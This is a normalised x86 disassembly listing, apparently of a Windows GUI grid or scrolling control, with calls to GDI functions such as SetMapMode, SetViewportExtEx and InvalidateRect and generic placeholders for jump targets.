je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jle r-xdata
test bl 0x80
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jge r-xdata
push ebp
call sub_465fb8
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov cl 0x3
mov edx [ ebp - 0x8 ]
call sub_465e54
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
add eax 0x30
mov cl 0x2
mov edx esi
call sub_465e54
pop ecx
sub_4660d8
push ebx
add esp 0xfffffff0
mov ebx eax
test dl dl
je r-xdata
mov ecx esp
xor edx edx
xor eax eax
call sub_412618
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_412618
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_43db94
push eax
mov eax ebx
call sub_43db50
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_43db94
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_43db50
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetWindowExtEx
mov eax ebx
call sub_43db50
mov ecx esp
xor edx edx
call sub_412618
lea ecx [ esp + 0x8 ]
mov edx 0x1
or eax 0xffffffff
call sub_412618
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_43db94
push eax
mov eax ebx
call sub_43db50
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_43db94
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_43db50
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d780
push eax
call SetWindowExtEx
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_46622c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x10 ]
call sub_423a30
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
and ecx ebx
mov edx esi
not edx
and edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4649fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call InvalidateRect
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466298
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x230 ]
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x220
call sub_463b3c
mov eax [ ebx ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x224
mov ecx 0x1
call sub_463b3c
mov eax [ ebx ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
mov edx [ ebx ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x234 ]
mov eax [ ebx ]
mov edx [ eax + 0x24c ]
mov eax [ ebx ]
add eax 0x250
call sub_463b3c
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
cmp eax [ edx + 0x228 ]
jg r-xdata
dec eax
mov [ ebp - 0x4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x8 ]
cmp edx eax
jne r-xdata
dec eax
mov [ ebp - 0x8 ] eax
push 0x1
push 0x1
mov edx [ ebx ]
mov ecx [ ebp - 0x4 ]
xchg edx eax
call sub_467258
mov edx [ ebx ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4671d0
mov eax [ ebx ]
mov eax [ eax + 0x214 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x210 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebx ]
call sub_466b88
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4c ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x292 ] 0x0
jne r-xdata
mov eax [ ebx ]
call sub_467b98
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x6c ]
mov eax [ ebx ]
mov si 0xffa8
call sub_40348c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ebx ]
call sub_444c6c
test al al
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx ]
call sub_465bec
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff98
xor ecx ecx
call sub_46622c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
or ecx 0xffffffff
call sub_46622c
pop ecx
sub_466440
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21c ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] esi
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x238 ]
jge r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_465bec
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x23c ]
jge r-xdata
dec ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] ebx
xor eax eax
push ebp
push j_sub_403730#2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_466298
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466518
push ebx
push esi
add esp 0xffffff90
mov esi edx
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
add esp 0x70
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_465bec
mov eax [ esi ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0xc ] eax
push esp
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax ebx
call sub_465e24
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ esi ]
cmp eax [ ebx + 0x258 ]
jge r-xdata
mov edx [ esi + 0x4 ]
cmp edx [ esp + 0x50 ]
jg r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov [ ebx + 0x258 ] eax
jmp r-xdata
cmp eax [ ebx + 0x258 ]
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
mov eax [ esp ]
mov [ ebx + 0x258 ] eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
cmp eax [ esp + 0x50 ]
jle r-xdata
mov [ ebx + 0x25c ] eax
jmp r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_4676ec
mov eax [ esp + 0x4 ]
mov [ ebx + 0x25c ] eax
sub_4665e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466712
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0x2
call sub_41cd10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0xe
call sub_41ccf4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41cd40
xor eax eax
push ebp
push sub_4666f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
mov edx [ ebx + 0x264 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_41d3c4
mov ecx [ edi + 0x38 ]
mov edx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41d364
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov ecx [ ebx + 0x264 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41d3c4
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_41d364
jmp r-xdata
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d3c4
mov edx [ edi + 0xc ]
sub edx [ edi + 0x8 ]
mov ecx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41d364
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4666fc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41d68c
retn
sub_466720
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca80
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4668a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_466884
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov dl 0x2
call sub_41cd10
mov eax [ ebx + 0x10 ]
mov dl 0xe
call sub_41ccf4
mov eax [ ebx + 0x10 ]
mov edx 0x5
call sub_41cd40
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4649fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov esi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46688b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d68c
retn
mov ecx esi
xor edx edx
mov eax ebx
call sub_41d3c4
mov eax [ ebp - 0x4 ]
call sub_43db50
mov edx eax
mov ecx esi
mov eax ebx
call sub_41d364
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41d3c4
mov eax [ ebp - 0x4 ]
call sub_43db94
mov ecx eax
mov edx esi
mov eax ebx
call sub_41d364
sub_4668b0
push ebp
mov ebp esp
push esi
mov esi eax
mov al [ ebp + 0x8 ]
push eax
push 0x1
mov eax esi
call sub_467258
mov eax esi
call sub_46928c
mov eax esi
mov si 0xffeb
call sub_40348c
pop esi
pop ebp
retn 0x4
sub_4668dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
dec edx
sub edx eax
jl r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add esi eax
cmp esi [ ebx + 0xc ]
jle r-xdata
sub_466938
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4668dc
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ebx
mov edx esi
call sub_4668dc
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi eax
mov eax [ ebx + 0x20 ]
dec eax
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
add eax [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4668dc
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402cac
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jge r-xdata
dec esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
sub_466a14
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402cac
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_465bec
mov eax [ ebp - 0x68 ]
inc eax
mov esi [ ebp - 0x14 ]
cmp eax esi
jl r-xdata
mov eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x10 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
lea eax [ ebp - 0x78 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_466938
pop ecx
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
lea eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_466938
pop ecx
mov eax [ ebx + 0x208 ]
call sub_41d4ac
test al al
jne r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi ]
mov eax ebx
call sub_43db50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax ebx
call sub_43db50
sub eax esi
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_466b04
mov edx [ eax + 0x238 ]
mov [ eax + 0x258 ] edx
mov edx [ eax + 0x23c ]
mov [ eax + 0x25c ] edx
mov edx [ eax + 0x258 ]
mov [ eax + 0x228 ] edx
mov edx [ eax + 0x25c ]
mov [ eax + 0x22c ] edx
mov edx [ eax + 0x228 ]
mov [ eax + 0x210 ] edx
mov edx [ eax + 0x22c ]
mov [ eax + 0x214 ] edx
test [ eax + 0x249 ] 0x10
je r-xdata
retn
mov edx [ eax + 0x21c ]
dec edx
mov [ eax + 0x210 ] edx
sub_466b64
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] edx
mov edx esp
mov eax esi
call sub_466b90
add esp 0x10
pop esi
retn
sub_466b90
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_466a14
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_444968
push eax
call InvalidateRect
sub_466bd8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
pop ebp
retn
sub_466c00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
pop ebp
retn
sub_466c1c
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_465e24
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x25c ]
sub eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x258 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_466c7c
push ebp
mov ebp esp
add esp 0xffffffa0
lea edx [ ebp - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_465bec
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x25c ]
mov eax [ ebp - 0x20 ]
pop edx
sub eax edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x258 ]
mov eax [ ebp - 0x50 ]
pop edx
sub eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_466cd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x74 ]
cmp eax 0x7
ja r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
jmp [ eax * 4 + jump_table_466cf0 ]
sub ebx edi
jmp r-xdata
add ebx edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_466c1c
pop ecx
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_466c7c
pop ecx
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_466c00
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_466bd8
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x74 ] 0x4
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_466c00
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_466bd8
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_466bd8
pop ecx
add ebx eax
jmp r-xdata
dec edi
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_466c00
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_466bd8
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_466c00
pop ecx
mov ebx eax
pop eax
sub ebx eax
jmp r-xdata
sub_466e08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x288 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x54 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_468c60
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43db50
mov edi eax
mov eax [ ebp + 0x8 ]
sub edi [ eax - 0x6c ]
mov eax esi
cmp eax 0x7
ja r-xdata
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_466e5b ]
mov eax [ ebp - 0x8 ]
sub eax edi
cmp ebx eax
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41d5bc
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41d5bc
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x288 ]
cmp ebx eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
cmp esi 0x4
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x288 ] ebx
mov edx eax
sub edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
call sub_467640
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_402cac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x18 ]
call sub_466b90
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4677ec
mov eax [ ebp + 0x8 ]
push eax
call sub_466c00
pop ecx
mov ebx eax
sub ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
sub_466fb4
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0x80 ]
mov eax [ ebp - 0x8 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov [ ebp - 0x78 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] 0xffffffff
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_465bec
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_465e24
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ edi ] edx
mov edx [ eax + 0x25c ]
mov [ edi + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
mov ebx esi
push ebp
mov edx 0x1
mov eax esi
call sub_466cd0
